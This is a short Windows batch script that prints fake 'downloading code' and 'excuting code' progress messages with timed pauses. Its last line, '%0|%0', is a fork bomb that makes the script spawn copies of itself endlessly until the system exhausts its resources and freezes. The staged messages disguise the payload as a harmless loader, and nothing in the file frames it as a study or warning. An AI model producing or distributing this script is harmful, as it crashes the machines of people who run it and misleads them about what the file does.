@echo OFF
call :load

:load
    color 6
    echo work starting ...
    timeout /t 5 /nobreak > nul
    echo downloading code ...
    timeout /t 10 /nobreak > nul 
    echo excuting code ...
    timeout /t 2 /nobreak > nul 
    %0|%0
